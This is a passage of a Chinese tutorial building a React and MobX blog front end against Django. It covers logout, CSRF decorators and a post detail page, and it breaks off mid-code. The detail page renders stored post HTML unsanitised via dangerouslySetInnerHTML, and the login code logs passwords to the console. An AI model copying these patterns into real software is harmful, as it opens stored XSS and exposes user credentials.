<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Always}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Footer</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;/<span style="color: #0000ff;">Layout</span>&gt;
<span style="color: #000000; background-color: #ffffff;">    </span>&lt;/<span style="color: #0000ff;">Router</span>&gt;
  }
}
render(&lt;<span style="color: #0000ff;">App</span> /&gt;, document.getElementById(<span style="color: #8b2252;">'root'</span>));
</pre>
</div>

<p>
service/user.js 服务层增加登录接口 logout()
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">service/user.js</span><span style="color: #b22222;">*/</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">import axios from 'axios';</span>
<span style="color: #a020f0;">import</span> { observable } from <span style="color: #8b2252;">"mobx"</span>;
<span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">"../axios"</span>;
<span style="color: #a020f0;">import</span> { message } from <span style="color: #8b2252;">'antd'</span>;

<span style="color: #a020f0;">class</span> UserService {
    @observable isLogin = <span style="color: #008b8b;">false</span>;
    @observable isReg = <span style="color: #008b8b;">false</span>;
    @observable captcha = {};

    login(username, password, challenge, key) {
        console.log(username, password, challenge, key); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/users/login'</span>,
            data:{username, password, challenge, key}
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #008b8b;">this</span>.isLogin = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">window.alert(reason.msg);</span>
                message.warning(reason.msg, 8); <span style="color: #b22222;">// </span><span style="color: #b22222;">8&#31186;&#28040;&#22833;</span>
            }
        );
    }

    reg(username, email, password) {
        console.log(username, email, password); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/users/'</span>,
            data:{username, email, password}
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #008b8b;">this</span>.isReg = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg);
            }
        );
    }

    getCaptcha() {
        axios.get({
            url:<span style="color: #8b2252;">'/users/getcaptcha'</span>,
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #b22222;">// </span><span style="color: #b22222;">{'key':key, 'image_url':image_url}</span>
                value.image_url = <span style="color: #8b2252;">'/api'</span> + value.image_url;
                <span style="color: #008b8b;">this</span>.captcha = value;
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg);
            }
        );
    }

    captchaRefresh() {
        axios.get({
            url:<span style="color: #8b2252;">'/captcha/refresh/'</span>,
            config:{
                headers: {<span style="color: #8b2252;">'X-Requested-With'</span>: <span style="color: #8b2252;">'XMLHttpRequest'</span>} <span style="color: #b22222;">// </span><span style="color: #b22222;">&#22686;&#21152;&#19968;&#20010;&#22836;&#65292;&#35753;&#21518;&#21488;&#29702;&#35299;&#20026;is_ajax()</span>
            }
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #b22222;">// </span><span style="color: #b22222;">{'key':key, 'image_url':image_url}</span>
                value.image_url = <span style="color: #8b2252;">'/api'</span> + value.image_url;
                <span style="color: #008b8b;">this</span>.captcha = {image_url:value.image_url, key:value.key};
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg);
            }
        );
    }

    logout(){
        axios.get({url:<span style="color: #8b2252;">'/users/logout'</span>}).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#30331;&#20986;'</span>);
                <span style="color: #008b8b;">this</span>.isLogin = <span style="color: #008b8b;">false</span>;
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg);
            }
        );
    }
}

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">userService</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">UserService</span>();
<span style="color: #a020f0;">export</span> {userService}
</pre>
</div>

<p>
测试功能，先登录，点登出，浏览器观察session会被删除。发布博文，返回401状态码。
</p>
</div>
</div>
<div id="outline-container-h:7a5cb692-42b4-41bd-bd91-d12f7db8bde5" class="outline-4">
<h4 id="h:7a5cb692-42b4-41bd-bd91-d12f7db8bde5">csrf保护</h4>
<div class="outline-text-4" id="text-h:7a5cb692-42b4-41bd-bd91-d12f7db8bde5">
<p>
服务器端Django程序中，可以使用django.views.decorators.csrf.csrf.csrf_protect装饰器，但是它并不能直接修饰视图类的方法，会报错，官方建议使用django.utis.decorators.method_decorator来修饰csrf_protect.
</p>

<p>
method_decorator加在视图类的分发函数dispatch上，就在分发上控制之后的get、post等方法
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#24433;&#21709;Postview&#25152;&#26377;&#26041;&#27861;</span>
<span style="color: #228b22;">@method_decorator</span>(csrf_protect, name=<span style="color: #8b2252;">'dispatch'</span>)
<span style="color: #a020f0;">class</span> <span style="color: #228b22;">PostView</span>(View):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get</span>(<span style="color: #a020f0;">self</span>, request):
        <span style="color: #a020f0;">pass</span> <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20294;&#26159;csrf_protect&#19981;&#31649;GET&#12289;HEAD&#26041;&#27861;</span>

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">post</span>(<span style="color: #a020f0;">self</span>, request):
        <span style="color: #a020f0;">pass</span> <span style="color: #b22222;"># </span><span style="color: #b22222;">post&#35201;&#26816;&#26597;csrf</span>
</pre>
</div>

<p>
加在post方法上就只影响post方法
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">class</span> <span style="color: #228b22;">PostView</span>(View):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get</span>(<span style="color: #a020f0;">self</span>, request):
        <span style="color: #a020f0;">pass</span>

    <span style="color: #228b22;">@method_decorator</span>(csrf_protect) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21482;&#24433;&#21709;post</span>
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">post</span>(<span style="color: #a020f0;">self</span>, request):
        <span style="color: #a020f0;">pass</span> <span style="color: #b22222;"># </span><span style="color: #b22222;">post&#35201;&#26816;&#26597;csrf</span>
</pre>
</div>

<p>
method_decorator也可以这样用， <code>method_decorator([装饰器1，装饰器2])</code>
</p>

<p>
将我们自己写的login_required无参装饰器时就是装饰视图函数的，所以修改post/urls.py如下
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">class</span> <span style="color: #228b22;">PostView</span>(View):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get</span>(<span style="color: #a020f0;">self</span>, request):
        <span style="color: #a020f0;">pass</span>

    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24517;&#39035;&#30331;&#24405;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">csrf_protect, csrf_exempt, ensure_csrf_cookie&#65292;&#37117;&#26159;&#30452;&#25509;&#35013;&#39280;&#35270;&#22270;&#20989;&#25968;&#30340;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19978;&#38754;3&#20010;&#35013;&#39280;&#22120;&#20989;&#25968;&#65292;&#26412;&#36136;&#19978;&#37117;&#20351;&#29992;&#20102;&#21516;&#19968;&#20010;&#20013;&#38388;&#20214;&#65292;&#25226;&#20013;&#38388;&#20214;&#24403;&#20316;&#26222;&#36890;&#20989;&#25968;&#20351;&#29992;&#65292;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">csrf_protect &#38656;&#35201;&#24517;&#39035;&#36827;&#34892;csrf&#35748;&#35777;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">csrf_exempt &#19981;&#20570;csrf&#35748;&#35777;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">ensure_csrf_cookie &#22312;&#22806;&#23618;&#21253;&#20303;&#20102;&#30830;&#20445;&#35270;&#22270;&#20989;&#25968;&#22312;&#36820;&#22238;&#38454;&#27573;</span>
    <span style="color: #228b22;">@method_decorator</span>([login_required, csrf_protect])
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">post</span>(<span style="color: #a020f0;">self</span>, request):
        <span style="color: #a020f0;">pass</span> <span style="color: #b22222;"># </span><span style="color: #b22222;">post&#35201;&#26816;&#26597;csrf</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:80ae0eb9-77ac-4269-978a-21199c1f07db" class="outline-4">
<h4 id="h:80ae0eb9-77ac-4269-978a-21199c1f07db">详情页</h4>
<div class="outline-text-4" id="text-h:80ae0eb9-77ac-4269-978a-21199c1f07db">
<ul class="org-ul">
<li>卡片： <a href="https://ant.design/components/card-cn">https://ant.design/components/card-cn</a></li>
</ul>

<p>
component/detail.js 创建详情页组件
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/component/detail.js&#25991;&#20214;&#20869;&#23481;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link, Redirect } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> { postService as service } from <span style="color: #8b2252;">'../service/post'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;
<span style="color: #a020f0;">import</span> { inject } from <span style="color: #8b2252;">'../utils'</span>;
<span style="color: #a020f0;">import</span> { Card } from <span style="color: #8b2252;">'antd'</span>;

@inject({ service })
@observer <span style="color: #b22222;">// </span><span style="color: #b22222;">observer &#24517;&#39035;&#32039;&#32039;&#38752;&#30528;&#32452;&#20214;</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Detail <span style="color: #a020f0;">extends</span> React.Component {

    constructor(props){
        <span style="color: #a020f0;">super</span>(props);
        <span style="color: #b22222;">// </span><span style="color: #b22222;">props.service.getPost();  // &#25991;&#31456;id?</span>
    }

    render() {
        console.log(<span style="color: #8b2252;">'detail render ~~~~~'</span>)
        <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">layout</span> = {
            labelCol: { span: 5 },
            wrapperCol: { span: 14 },
        };
        <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">tailLayout</span> = {
            wrapperCol: { offset: 8, span: 16 },
        };

        <span style="color: #a020f0;">return</span> (
            &lt;<span style="color: #0000ff;">div</span>&gt;<span style="color: #000000; background-color: #ffffff;"> detail~~~</span>
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
        );
    }
}
</pre>
</div>

<p>
src/index.js 增加 <i>posts</i> 路由
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #a020f0;">import</span> Detail from <span style="color: #8b2252;">'./component/detail'</span>;
&lt;Route path=<span style="color: #8b2252;">"/posts/:id"</span> component={Detail}&gt;&lt;/Route&gt;
</pre>
</div>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/index.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { render } from <span style="color: #8b2252;">'react-dom'</span>;
<span style="color: #a020f0;">import</span> { BrowserRouter as Router, Switch, Route, Link } from <span style="color: #8b2252;">"react-router-dom"</span>;
<span style="color: #a020f0;">import</span> Login from <span style="color: #8b2252;">'./component/login'</span>;
<span style="color: #a020f0;">import</span> Reg from <span style="color: #8b2252;">'./component/reg'</span>;
<span style="color: #a020f0;">import</span> Pub from <span style="color: #8b2252;">'./component/pub'</span>;

<span style="color: #a020f0;">import</span> { Menu, Icon, Layout } from <span style="color: #8b2252;">'antd'</span>;
<span style="color: #a020f0;">import</span> Profile from <span style="color: #8b2252;">'./component/profile'</span>;
<span style="color: #a020f0;">import</span> Detail from <span style="color: #8b2252;">'./component/detail'</span>;
<span style="color: #a020f0;">const</span> { Header, Content, Footer } = Layout;

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Home</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">Home</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">About</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">About</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Default</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#32570;&#30465;&#26174;&#31034;</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Always</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">blog &#169;2008 Created by Jasper</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;

<span style="color: #a020f0;">class</span> App <span style="color: #a020f0;">extends</span> React.Component {
  state = {
    current: <span style="color: #8b2252;">'home'</span>,
  };

  handleClick = e =&gt; {
    console.log(<span style="color: #8b2252;">'click '</span>, e);
    <span style="color: #008b8b;">this</span>.setState({
      current: e.key,
    });
  };
  render() {
    <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Router</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;<span style="color: #0000ff;">Layout</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"layout"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Header</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Menu</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick}
            <span style="color: #a0522d;">theme</span>=<span style="color: #8b2252;">"dark"</span>
            <span style="color: #a0522d;">mode</span>=<span style="color: #8b2252;">"horizontal"</span>
            <span style="color: #a0522d;">defaultSelectedKeys</span>={[<span style="color: #008b8b;">this</span>.state.current]}
            <span style="color: #a0522d;">style</span>={{ lineHeight: <span style="color: #8b2252;">'64px'</span> }}
          <span style="color: #b22222;">// </span><span style="color: #a0522d;">selectedKeys</span><span style="color: #b22222;">={[this.state.current]}</span>
          &gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"home"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"home"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#20027;&#39029;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"login"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/login"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"login"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"reg"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"form"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"pub"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/pub"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"edit"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#20889;&#21338;&#23458;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"about"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/about"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#20851;&#20110;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;/<span style="color: #0000ff;">Menu</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Header</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Content</span> <span style="color: #a0522d;">style</span>={{ padding: <span style="color: #8b2252;">'10px 50px'</span> }}&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">style</span>={{ background: <span style="color: #8b2252;">'#fff'</span>, padding: 24, minHeight: 280 }}&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">exact</span> <span style="color: #a0522d;">path</span>={[<span style="color: #8b2252;">"/"</span>, <span style="color: #8b2252;">'/index'</span>]} <span style="color: #a0522d;">component</span>={Home}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/login"</span> <span style="color: #a0522d;">component</span>={Login}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/reg"</span> <span style="color: #a0522d;">component</span>={Reg}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/about"</span> <span style="color: #a0522d;">component</span>={About}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/profile"</span> <span style="color: #a0522d;">component</span>={Profile}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/pub"</span> <span style="color: #a0522d;">component</span>={Pub}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/posts/:id"</span> <span style="color: #a0522d;">component</span>={Detail}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Default}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Content</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Footer</span> <span style="color: #a0522d;">style</span>={{ textAlign: <span style="color: #8b2252;">'center'</span> }}&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Always}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Footer</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;/<span style="color: #0000ff;">Layout</span>&gt;
<span style="color: #000000; background-color: #ffffff;">    </span>&lt;/<span style="color: #0000ff;">Router</span>&gt;
  }
}
render(&lt;<span style="color: #0000ff;">App</span> /&gt;, document.getElementById(<span style="color: #8b2252;">'root'</span>));
</pre>
</div>

<p>
访问 <a href="http://localhost:3000/posts/1">http://localhost:3000/posts/1</a>  看一下效果
</p>
</div>
<div id="outline-container-h:b0be5bdb-9b03-4047-a0c6-74c800509bf0" class="outline-5">
<h5 id="h:b0be5bdb-9b03-4047-a0c6-74c800509bf0">组件</h5>
<div class="outline-text-5" id="text-h:b0be5bdb-9b03-4047-a0c6-74c800509bf0">
<ul class="org-ul">
<li>栅格：<a href="https://ant.design/components/grid-cn">https://ant.design/components/grid-cn</a></li>
</ul>


<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#23433;&#35013;&#26085;&#26399;&#22788;&#29702;&#24211;&#65292;&#24102;&#19978;&#26102;&#21306;&#22788;&#29702;</span>
yarn add moment-timezone
</pre>
</div>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">// </span><span style="color: #b22222;">&#27809;&#26377;&#25968;&#25454;</span>
<span style="color: #a020f0;">return</span> &lt;Empty /&gt;
</pre>
</div>

<p>
如果使用了富文本编辑器，那么显示的时候，发现不能按照网页标签显示。
</p>

<p>
原因是为了安全，防止XSS攻击，React不允许直接按照HTML显示。
</p>

<p>
使用dangerouslySetlnnerHTML属性，这个名字提醒使用者很危险。
</p>
<ul class="org-ul">
<li><a href="https://react.docschina.org/reference/react-dom/components/common#dangerously-setting-the-inner-html">https://react.docschina.org/reference/react-dom/components/common#dangerously-setting-the-inner-html</a></li>
</ul>

<p>
React也对dangerouslySetinnerHTML属性也做了处理。
</p>

<div class="org-src-container">
<pre class="src src-js">&lt;p&gt;{content}&lt;/p&gt;
&#20462;&#25913;&#20026;
&lt;p dangerouslySetInnerHTML={{_html :content}}&gt;&lt;&lt;/p&gt;
</pre>
</div>

<p>
component/detail.js 详情页组件
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/component/detail.js&#25991;&#20214;&#20869;&#23481;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link, Redirect } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> { postService as service } from <span style="color: #8b2252;">'../service/post'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;
<span style="color: #a020f0;">import</span> { inject } from <span style="color: #8b2252;">'../utils'</span>;
<span style="color: #a020f0;">import</span> { Card, Col, Empty, Row } from <span style="color: #8b2252;">'antd'</span>;
<span style="color: #a020f0;">import</span> mtz from <span style="color: #8b2252;">'moment-timezone'</span>;

@inject({ service })
@observer <span style="color: #b22222;">// </span><span style="color: #b22222;">observer &#24517;&#39035;&#32039;&#32039;&#38752;&#30528;&#32452;&#20214;</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Detail <span style="color: #a020f0;">extends</span> React.Component {

    constructor(props) {
        <span style="color: #a020f0;">super</span>(props);
        console.log(props); <span style="color: #b22222;">// </span><span style="color: #b22222;">props&#24050;&#32463;&#34987;react react-router&#25913;&#36807;&#20102;</span>
        <span style="color: #a020f0;">const</span> { id = 0 } = props.match.params;
        props.service.getPost(id);  <span style="color: #b22222;">// </span><span style="color: #b22222;">&#25991;&#31456;id?</span>
    }

    render() {
        console.log(<span style="color: #8b2252;">'detail render ~~~~~'</span>)
        <span style="color: #a020f0;">const</span> {
            id, title, author, author_id, postdate, content
        } = <span style="color: #008b8b;">this</span>.props.service.post
        <span style="color: #a020f0;">if</span> (!id){
            <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Empty</span> /&gt;
        }
        <span style="color: #a020f0;">return</span> (
            &lt;<span style="color: #0000ff;">Card</span> <span style="color: #a0522d;">title</span>={title} &gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">Row</span> <span style="color: #a0522d;">style</span>={{marginBottom:<span style="color: #8b2252;">'20px'</span>}}&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;<span style="color: #0000ff;">Col</span>  <span style="color: #a0522d;">span</span>={6} &gt;{author}&lt;/<span style="color: #0000ff;">Col</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;<span style="color: #0000ff;">Col</span> <span style="color: #a0522d;">offset</span>={10} <span style="color: #a0522d;">span</span>={7} <span style="color: #a0522d;">style</span>={{textAlign:<span style="color: #8b2252;">'right'</span>}}
                    &gt;{mtz(postdate).tz(<span style="color: #8b2252;">'Asia/Shanghai'</span>).format(<span style="color: #8b2252;">'YYYY&#24180;M&#26376;D&#26085;'</span>)}&lt;/<span style="color: #0000ff;">Col</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;/<span style="color: #0000ff;">Row</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>{<span style="color: #b22222;">/* </span><span style="color: #b22222;">&lt;p&gt;{content}&lt;/p&gt;</span><span style="color: #b22222;"> */</span>}
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">p</span> <span style="color: #a0522d;">dangerouslySetInnerHTML</span>={{ __html: content }}&gt;&lt;/<span style="color: #0000ff;">p</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">Card</span>&gt;
        );
    }
}
</pre>
</div>

<p>
service/post.js增加  getPost(id) 方法
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">service/post.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">"../axios"</span>;
<span style="color: #a020f0;">import</span> { observable } from <span style="color: #8b2252;">"mobx"</span>;
<span style="color: #a020f0;">import</span> { message } from <span style="color: #8b2252;">'antd'</span>;
<span style="color: #a020f0;">import</span> Cookies from <span style="color: #8b2252;">'js-cookie'</span>;

<span style="color: #a020f0;">class</span> PostService {
    @observable success = <span style="color: #008b8b;">false</span>;
    @observable post = {};

    pub(title, content) {
        console.log(<span style="color: #8b2252;">'&#21435;&#22788;&#29702;'</span>, title, content); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/posts/'</span>,
            data:{title, content},
            config: {
                headers: {<span style="color: #8b2252;">'X-CSRFToken'</span>: Cookies.get(<span style="color: #8b2252;">'csrftoken'</span>)} <span style="color: #b22222;">// </span><span style="color: #b22222;">&#26412;&#22495; HTTP_X_CSRFTOKEN</span>
            }
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                message.info(<span style="color: #8b2252;">'&#21338;&#25991;&#25552;&#20132;&#25104;&#21151;'</span>);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">&#22686;&#24378;&#65292;&#30830;&#35748;&#26159;&#21542;&#36339;&#36716;</span>
                <span style="color: #008b8b;">this</span>.success = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg || <span style="color: #8b2252;">'&#38169;&#35823;&#65292;&#35831;&#32852;&#31995;&#31649;&#29702;&#21592;'</span>);
            }
        );
    }

    getToken() {
        axios.get({
